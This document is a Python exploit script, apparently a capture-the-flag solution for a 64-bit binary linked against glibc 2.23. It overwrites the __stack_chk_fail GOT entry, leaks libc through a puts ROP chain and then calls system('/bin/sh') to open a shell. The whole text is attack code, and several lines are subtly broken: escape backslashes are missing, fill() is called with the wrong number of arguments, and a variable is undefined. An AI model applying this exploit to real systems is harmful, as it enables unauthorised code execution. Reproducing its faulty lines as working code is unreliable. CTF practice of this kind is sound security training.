# from LibcSearcher import *
from helper import *
import ctypes as c
from exp import ret2libc_A, ret2libc_B
loader = Loader("target/pwn1", 64, debug=True)
loader.patch_AIO(2.23)
elf,libc = loader.init()
# libc = ELF("buuoj/16/64/libc.so.6")
io = loader.process()
# io = loader.ida()
abbre(globals(), io, loader) # 此处定义了常用的缩写
menu(globals())

def write(addr, content):
    sla(b"choice", b"0")
    sla(b"address",bt(addr))
    ru(b"content:",content) 
    return r(8)

def fill(size, content):
    sla(b"choice",b"1")
    sla(b"size:",bt(size))
    sla(b"content:",bt(content)) 
    

main=0x000000000040090B
write(elf.got['__stack_chk_fail'],p64(elf.plt['puts']))
pop_rdi_ret=0x0000000000400a03
pop_rsi_r15_ret=0x0000000000400a01
payload ='A'*(0x110-8)
payload+='x00'*8
payload+='B'*8
payload+=p64(pop_rdi_ret)
payload+=p64(elf.got['read'])
payload+=p64(elf.plt['puts'])
payload+=p64(main)
fill(payload)
sla('choice','2')
libc_base=u64(p.recvuntil('x7f')[-6:].ljust(8,'x00'))-libc.sym['read']
success('libc_base:'+hex(libc_base))
system=libc_base+libc.sym['system']
sh=libc_base+libc.search('/bin/shx00').next()
payload ='A'*(0x110-8)
payload+='x00'*8
payload+='B'*8
payload+=p64(pop_rdi_ret)
payload+=p64(sh)
payload+=p64(system)
payload+=p64(main)
fill(payload)
sla('choice','2')
shell()